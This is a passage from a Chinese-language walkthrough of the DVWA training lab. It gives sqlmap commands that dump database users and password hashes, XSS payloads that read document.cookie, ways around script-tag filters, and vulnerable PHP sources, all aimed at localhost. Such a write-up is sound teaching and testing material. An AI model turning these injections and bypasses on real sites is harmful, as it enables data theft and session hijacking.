</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch --current-db  
</code></pre></td></tr></table></div></div><ul><li>列出数据库中所有用户</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch --users  
</code></pre></td></tr></table></div></div><ul><li>获取当前操作的用户</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch --current-user  
</code></pre></td></tr></table></div></div><ul><li>列出可连接数据库的所有账户-对应的密码哈希</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch --passwords  
</code></pre></td></tr></table></div></div><ul><li>列出数据库中所有的数据表</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch -D dvwa --tables  
</code></pre></td></tr></table></div></div><ul><li>列出数据表中所有字段</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch -D dvwa -T users --columns  
</code></pre></td></tr></table></div></div><ul><li>导出特定数据表中的字段</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=low; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch -D dvwa -T users -C <span class=s2>&#34;user,password&#34;</span> --dump  
</code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/18.png data-srcset="/images/dvwa/18.png, /images/dvwa/18.png 1.5x, /images/dvwa/18.png 2x" data-sizes=auto alt=/images/dvwa/18.png title=/images/dvwa/18.png></p><h3 id=medium-6>medium</h3><p><code>POST</code> 请求，参数在<code>POST</code>请求体中传递。此时，构造SQLMap操作命令，则需要将url和data分成两部分分别填写，同时需要更新cookie信息的取值。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py -u <span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/#&gt;&#34;</span> --data<span class=o>=</span><span class=s2>&#34;id=1&amp;Submit=Submit&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;security=medium; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch -D dvwa -T users -C <span class=s2>&#34;user,password&#34;</span> --dump  
</code></pre></td></tr></table></div></div><h3 id=high-6>high</h3><ol><li>High级别的查询数据提交的页面、查询结果显示的页面是分离成了2个不同的窗口分别控制的。即在查询提交窗口提交数据（POST请求）之后，需要到另外一个窗口进行查看结果（GET请求）。若需获取请求体中的Form Data数据，则需要在提交数据的窗口中查看网络请求数据or通过拦截工具获取。</li><li>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：<code>--second-order="xxxurl"</code>（设置二阶响应的结果显示页面的url），具体的操作命令可参看==><a href=https://www.jianshu.com/p/fa77f2ed788b target=_blank rel="noopener noreffer">SQLMap工具使用选项的操作命令&功能</a></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>python sqlmap.py --url<span class=o>=</span><span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/cookie-input.php&gt;&#34;</span> --data<span class=o>=</span><span class=s2>&#34;id=1&amp;Submit=Submit&#34;</span> --second-url<span class=o>=</span><span class=s2>&#34;&lt;http://localhost/vulnerabilities/sqli_blind/&gt;&#34;</span> --cookie<span class=o>=</span><span class=s2>&#34;id=1; security=high; PHPSESSID=5tsca0iocc9ug7mr4mfb4hnba4&#34;</span> --batch  
</code></pre></td></tr></table></div></div><h2 id=weak-session-ids>weak session ids</h2><p>low: 使用+1的规则生成session</p><p>medium: 直接使用时间戳生成session</p><p>high: 使用md5计算session</p><p>上述三种都可以用<code>Hackbar</code>和<code>burp</code>来完成session预测</p><p>impossible使用随机数+时间戳+固定字符串（&ldquo;Impossible&rdquo;）进行 sha1 运算，作为 session Id。</p><h2 id=xssdom>XSS(DOM)</h2><h3 id=dom树>DOM树</h3><p>HTML 文档的主干是标签（tag）。</p><p>根据文档对象模型（DOM），每个 HTML 标签都是一个对象。嵌套的标签是闭合标签的“子标签（children）”。标签内的文本也是一个对象。</p><p>所有这些对象都可以通过 JavaScript 来访问，我们可以使用它们来修改页面。</p><p>例如，<code>document.body</code> 是表示 <code>&lt;body></code> 标签的对象。</p><p>HTML DOM 是关于如何获取、修改、添加或删除 HTML 元素的标准</p><p>简单来说DOM主要研究的是<code>节点</code>，所有节点可通过javascript访问(增，删，改，查)</p><p>对于DOM型的XSS是一种基于DOM树的一种代码注入攻击方式，可以是反射型的，也可以是存储型的</p><p>最大的特点就是<em>不与后台服务器交互，只是通过浏览器的DOM树解析产生</em></p><p>可能触发DOM型XSS属性：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>document.write属性  
document.referer属性  
innerHTML属性  
windows.name属性  
location属性  
</code></pre></td></tr></table></div></div><h3 id=low-7>low</h3><p>没有任何防护</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash><span class=k>if</span> <span class=o>(</span>document.location.href.indexOf<span class=o>(</span><span class=s2>&#34;default=&#34;</span><span class=o>)</span> &gt;<span class=o>=</span> 0<span class=o>)</span> <span class=o>{</span>  
						var <span class=nv>lang</span> <span class=o>=</span> document.location.href.substring<span class=o>(</span>document.location.href.indexOf<span class=o>(</span><span class=s2>&#34;default=&#34;</span><span class=o>)</span>+8<span class=o>)</span><span class=p>;</span> <span class=c1># 函数截取url中指定参数后面的内容  </span>
						document.write<span class=o>(</span><span class=s2>&#34;&lt;option value=&#39;&#34;</span> + lang + <span class=s2>&#34;&#39;&gt;&#34;</span> + decodeURI<span class=o>(</span>lang<span class=o>)</span> + <span class=s2>&#34;&lt;/option&gt;&#34;</span><span class=o>)</span><span class=p>;</span> <span class=c1># 将HTML表达式或JavaScript代码  </span>
						document.write<span class=o>(</span><span class=s2>&#34;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&#34;</span><span class=o>)</span><span class=p>;</span>  
					<span class=o>}</span>  
					      
					document.write<span class=o>(</span><span class=s2>&#34;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&#34;</span><span class=o>)</span><span class=p>;</span>  
					document.write<span class=o>(</span><span class=s2>&#34;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&#34;</span><span class=o>)</span><span class=p>;</span>  
					document.write<span class=o>(</span><span class=s2>&#34;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&#34;</span><span class=o>)</span><span class=p>;</span>  
					document.write<span class=o>(</span><span class=s2>&#34;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&#34;</span><span class=o>)</span><span class=p>;</span>  
</code></pre></td></tr></table></div></div><p>将标签写成如下形式：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-bash data-lang=bash>&lt;http://localhost/vulnerabilities/xss_d/?default<span class=o>=</span>%3Cscript%3Ealert<span class=o>(</span>document.cookie<span class=o>)</span>%3C/script%3E&gt;  
</code></pre></td></tr></table></div></div><p>即可完成弹框。</p><h3 id=medium-7>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=c1>// Is there any input?  
</span><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=nx>array_key_exists</span><span class=p>(</span> <span class=s2>&#34;default&#34;</span><span class=p>,</span> <span class=nv>$_GET</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>is_null</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;default&#39;</span> <span class=p>])</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=nv>$default</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;default&#39;</span><span class=p>];</span>  
      
    <span class=c1># Do not allow script tags  
</span><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>stripos</span> <span class=p>(</span><span class=nv>$default</span><span class=p>,</span> <span class=s2>&#34;&lt;script&#34;</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>  
        <span class=nx>header</span> <span class=p>(</span><span class=s2>&#34;location: ?default=English&#34;</span><span class=p>);</span>  
        <span class=k>exit</span><span class=p>;</span>  
    <span class=p>}</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>不允许<code>&lt;script></code>标签。可以选择其他标签：<code>&lt;img src=1 onerror=alert(1)></code></p><p>但是直接写在default后面解析会有问题:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/19.png data-srcset="/images/dvwa/19.png, /images/dvwa/19.png 1.5x, /images/dvwa/19.png 2x" data-sizes=auto alt=/images/dvwa/19.png title=/images/dvwa/19.png></p><p><code>&lt;option></code>标签里面没有值了。可以选择先闭合option标签，再闭合select标签。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;/</span><span class=nt>option</span><span class=p>&gt;&lt;/</span><span class=nt>select</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>1</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(document.cookie)</span><span class=p>&gt;</span>  
</code></pre></td></tr></table></div></div><p>或者直接闭合select</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-html data-lang=html><span class=p>&lt;/</span><span class=nt>select</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>1</span> <span class=na>onerror</span><span class=o>=</span><span class=s>alert(document.cookie)</span><span class=p>&gt;</span>  
</code></pre></td></tr></table></div></div><h3 id=high-7>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=c1>// Is there any input?  
</span><span class=c1></span><span class=k>if</span> <span class=p>(</span> <span class=nx>array_key_exists</span><span class=p>(</span> <span class=s2>&#34;default&#34;</span><span class=p>,</span> <span class=nv>$_GET</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>is_null</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;default&#39;</span> <span class=p>])</span> <span class=p>)</span> <span class=p>{</span>  
  
    <span class=c1># White list the allowable languages  
</span><span class=c1></span>    <span class=k>switch</span> <span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;default&#39;</span><span class=p>])</span> <span class=p>{</span>  
        <span class=k>case</span> <span class=s2>&#34;French&#34;</span><span class=o>:</span>  
        <span class=k>case</span> <span class=s2>&#34;English&#34;</span><span class=o>:</span>  
        <span class=k>case</span> <span class=s2>&#34;German&#34;</span><span class=o>:</span>  
        <span class=k>case</span> <span class=s2>&#34;Spanish&#34;</span><span class=o>:</span>  
            <span class=c1># ok  
</span><span class=c1></span>            <span class=k>break</span><span class=p>;</span>  
        <span class=k>default</span><span class=o>:</span>  
            <span class=nx>header</span> <span class=p>(</span><span class=s2>&#34;location: ?default=English&#34;</span><span class=p>);</span>  
            <span class=k>exit</span><span class=p>;</span>  
    <span class=p>}</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>URL中<code>#</code>号之后的内容，不会被提交到服务器，可以直接与浏览器进行交互</p><p>在正常url后输入：<code>#&lt;script>alert(document.cookie)&lt;/script></code>即可。</p><h2 id=xss-reflect>XSS Reflect</h2><h3 id=low-8>low</h3><p>没做过滤<code>&lt;script>alert(1)&lt;/script></code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/20.png data-srcset="/images/dvwa/20.png, /images/dvwa/20.png 1.5x, /images/dvwa/20.png 2x" data-sizes=auto alt=/images/dvwa/20.png title=/images/dvwa/20.png></p><h3 id=medium-8>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=nx>header</span> <span class=p>(</span><span class=s2>&#34;X-XSS-Protection: 0&#34;</span><span class=p>);</span>  
  
<span class=c1>// Is there any input?  
</span><span class=c1></span><span class=k>if</span><span class=p>(</span> <span class=nx>array_key_exists</span><span class=p>(</span> <span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=nv>$_GET</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;name&#39;</span> <span class=p>]</span> <span class=o>!=</span> <span class=k>NULL</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$name</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span> <span class=s1>&#39;&lt;script&gt;&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;name&#39;</span> <span class=p>]</span> <span class=p>);</span>  
  
    <span class=c1>// Feedback for end user  
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;Hello </span><span class=si>${</span><span class=nv>name</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>对<code>&lt;script></code>进行了过滤，有三种绕过方式</p><ol><li>使用双写绕过，<code>&lt;scr&lt;script>ipt>alert(1)&lt;/script></code></li><li>使用大小写绕过<code>sCript>alert(1)&lt;/script></code></li><li>使用其他标签。<code>&lt;img src=1 onerror=alert(1)></code></li></ol><h3 id=high-8>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=nx>header</span> <span class=p>(</span><span class=s2>&#34;X-XSS-Protection: 0&#34;</span><span class=p>);</span>  
  
<span class=c1>// Is there any input?  
</span><span class=c1></span><span class=k>if</span><span class=p>(</span> <span class=nx>array_key_exists</span><span class=p>(</span> <span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=nv>$_GET</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;name&#39;</span> <span class=p>]</span> <span class=o>!=</span> <span class=k>NULL</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$name</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span> <span class=s1>&#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;name&#39;</span> <span class=p>]</span> <span class=p>);</span>  
  
    <span class=c1>// Feedback for end user  
</span><span class=c1></span>    <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;Hello </span><span class=si>${</span><span class=nv>name</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>正则匹配绕过<code>&lt;script></code>，可以用img标签。</p><h2 id=xss-stored>XSS Stored</h2><h3 id=low-9>low</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;btnSign&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get input  
</span><span class=c1></span>    <span class=nv>$message</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;mtxMessage&#39;</span> <span class=p>]</span> <span class=p>);</span>  
    <span class=nv>$name</span>    <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;txtName&#39;</span> <span class=p>]</span> <span class=p>);</span>  
  
    <span class=c1>// Sanitize message input  
</span><span class=c1></span>    <span class=nv>$message</span> <span class=o>=</span> <span class=nx>stripslashes</span><span class=p>(</span> <span class=nv>$message</span> <span class=p>);</span>  
    <span class=nv>$message</span> <span class=o>=</span> <span class=p>((</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$message</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nx>trigger_error</span><span class=p>(</span><span class=s2>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&#34;&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>));</span>  
  
    <span class=c1>// Sanitize name input  
</span><span class=c1></span>    <span class=nv>$name</span> <span class=o>=</span> <span class=p>((</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$name</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nx>trigger_error</span><span class=p>(</span><span class=s2>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&#34;&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>));</span>  
  
    <span class=c1>// Update database  
</span><span class=c1></span>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;</span><span class=si>$message</span><span class=s2>&#39;, &#39;</span><span class=si>$name</span><span class=s2>&#39; );&#34;</span><span class=p>;</span>  
    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
  
    <span class=c1>//mysql_close();  
</span><span class=c1></span><span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p><code>isset()</code>函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false</p><p><code>trim()</code>函数作用为移除字符串两侧空白字符或其他预定义字符</p><p><code>stripslashes()</code>函数用于删除字符串中的反斜杠</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-fallback data-lang=fallback>mysqli_real_escape_string()`函数会对字符串中的特殊符号`(\\x00，\\n，\\r，\\，&#39;，&#34;，\\x1a)  
</code></pre></td></tr></table></div></div><p>进行转义。</p><p>在代码中对message，name输入框内容没有进行XSS方面的过滤和检查。且通过<code>query</code>语句插入到数据库中。所以存在存储型XSS漏洞。</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/21.png data-srcset="/images/dvwa/21.png, /images/dvwa/21.png 1.5x, /images/dvwa/21.png 2x" data-sizes=auto alt=/images/dvwa/21.png title=/images/dvwa/21.png></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/22.png data-srcset="/images/dvwa/22.png, /images/dvwa/22.png 1.5x, /images/dvwa/22.png 2x" data-sizes=auto alt=/images/dvwa/22.png title=/images/dvwa/22.png></p><p>medium, high和上面反射类型的绕过方式相同</p><h2 id=csp-bypass>CSP bypass</h2><p>CSP：浏览器的安全策略，如果标签，或者是服务器中返回 HTTP 头中有 <code>Content-Security-Policy</code> 标签 ，浏览器会根据标签里面的内容，判断哪些资源可以加载或执行</p><h3 id=low-10>low</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=nv>$headerCSP</span> <span class=o>=</span> <span class=s2>&#34;Content-Security-Policy: script-src &#39;self&#39; &lt;https://pastebin.com&gt;  example.com code.jquery.com &lt;https://ssl.google-analytics.com&gt; ;&#34;</span><span class=p>;</span> <span class=c1>// allows js from self, pastebin.com, jquery and google analytics.  
</span><span class=c1></span>  
<span class=nx>header</span><span class=p>(</span><span class=nv>$headerCSP</span><span class=p>);</span>  
  
<span class=c1># &lt;https://pastebin.com/raw/R570EE00&gt;  
</span><span class=c1></span>  
<span class=cp>?&gt;</span><span class=err>  
</span><span class=err>&lt;?php  
</span><span class=err>if (isset ($_POST[&#39;include&#39;])) {  
</span><span class=err>$page[ &#39;body&#39; ] .= &#34;  
</span><span class=err>    &lt;script src=&#39;&#34; . $_POST[&#39;include&#39;] . &#34;&#39;&gt;&lt;/script&gt;  
</span><span class=err>&#34;;  
</span><span class=err>}  
